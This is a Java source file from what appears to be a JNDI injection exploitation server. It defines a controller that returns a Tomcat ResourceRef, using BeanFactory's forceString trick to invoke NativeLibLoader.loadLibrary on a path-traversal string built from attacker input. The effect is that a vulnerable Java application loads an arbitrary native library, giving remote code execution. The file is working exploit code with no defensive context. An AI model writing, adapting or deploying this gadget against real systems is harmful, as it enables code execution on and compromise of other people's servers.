package com.h2tg.ysogate.controller.bypass;

import com.h2tg.ysogate.annotation.JNDIController;
import com.h2tg.ysogate.annotation.JNDIMapping;
import com.h2tg.ysogate.controller.Controller;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/NativeLibLoader")
public class NativeLibLoaderController implements Controller {
    @Override
    public Object process(Object obj) {
        String path = obj.toString();
        System.out.println("[Reference] Factory: BeanFactory + NativeLibLoader");

        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        ref.add(new StringRefAddr("a", "/../../../../../../../../../../../../" + path));
        return ref;
    }

    @JNDIMapping("/{path}")
    public String loadLibrary(String path) {
        System.out.println("[NativeLibLoader] Library Path: " + path);
        return path;
    }
}
